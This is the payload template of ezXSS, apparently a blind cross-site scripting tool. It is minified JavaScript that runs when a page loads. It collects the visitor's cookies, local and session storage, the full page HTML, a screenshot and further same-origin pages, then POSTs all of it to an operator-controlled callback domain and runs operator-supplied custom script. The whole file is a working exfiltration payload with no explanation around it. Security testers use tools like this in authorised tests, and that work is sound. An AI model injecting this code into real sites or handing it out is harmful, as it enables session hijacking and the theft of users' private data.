// github.com/ssl/ezXSS
// ezXSS {{version}}

function ez_n(e){return void 0 !==e?e:''}
function ez_cb(t,e){var n=new XMLHttpRequest;n.open("POST",("https:"!==location.protocol?"http:":"https:")+"//{{domain}}/callback",!0),n.setRequestHeader("Content-type","text/plain"),n.timeout=6e4,n.onreadystatechange=function(){4===n.readyState&&200===n.status&&null!==e&&e(n.responseText)},n.send(JSON.stringify(t))}
function ez_hL(){try{ez_rD.uri=ez_n(location.toString())}catch(t){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(e){ez_rD.cookies=""}try{ez_rD.referer=ez_n(document.referrer)}catch(o){ez_rD.referer=""}try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(r){ez_rD["user-agent"]=""}try{ez_rD.origin=ez_n(location.origin)}catch(c){ez_rD.origin=""}try{ez_rD.localstorage=ez_n(window.localStorage)}catch(a){ez_rD.localstorage=""}try{ez_rD.sessionstorage=ez_n(window.sessionStorage)}catch(n){ez_rD.sessionstorage=""}try{ez_rD.dom=ez_n(document.documentElement.outerHTML)}catch(s){ez_rD.dom=""}try{ez_rD.payload="{%data payload}"}catch(i){ez_rD.payload=""}try{"undefined"!=typeof html2canvas?html2canvas(document.body,{"max-width":1920,"max-height":1080}).then(function(t){ez_rD.screenshot=ez_n(t.toDataURL()),y()}).then(void 0,function(t){ez_rD.screenshot="",y()}):(ez_rD.screenshot="",y())}catch(h){ez_rD.screenshot="",y()}function y(){ez_s(),ez_nW(),ez_cb(ez_rD,null),ez_cp(),ez_p()}}
function ez_p(){"function"==typeof ez_persist&&ez_persist()}function ez_s(){var t,n,o=[{%data noCollect}];for(t=0,n=o.length;t<n;++t)ez_rD[o[t]]="Not collected"}function ez_cp(){var t,n,o=[{%data pages}];for(t=0,n=o.length;t<n;++t)ez_dc(o[t])}
function ez_dc(e){try{var o="//"+location.hostname+e,a=new XMLHttpRequest;a.onreadystatechange=function(){4==a.readyState&&(cbdata={dom:ez_n(a.responseText),uri:ez_n(o),origin:ez_n(location.hostname),referer:"Collected page via "+ez_n(location.toString()),cookies:ez_n(document.cookie),"user-agent":ez_n(navigator.userAgent),sessionstorage:ez_n(window.sessionStorage),localstorage:ez_n(window.localStorage),payload:"{%data payload}"},ez_cb(cbdata,null))},a.open("GET",o,!0),a.send(null)}catch(t){}}
function ez_r() { {%data customjs}
}
function ez_j() { {%data globaljs}
}
{%data persistent}
{%data screenshot}
function ez_aE(t,e,n){t.addEventListener?t.addEventListener(e,n,!1):t.attachEvent&&t.attachEvent("on"+e,n)}var ez_rD={};if("complete"===document.readyState)ez_hL();else{var t=setTimeout(function(){ez_hL()},2e3);ez_aE(window,"load",function(){clearTimeout(t),ez_hL()})}function ez_nW(){try{ez_r(),ez_j()}catch(t){}}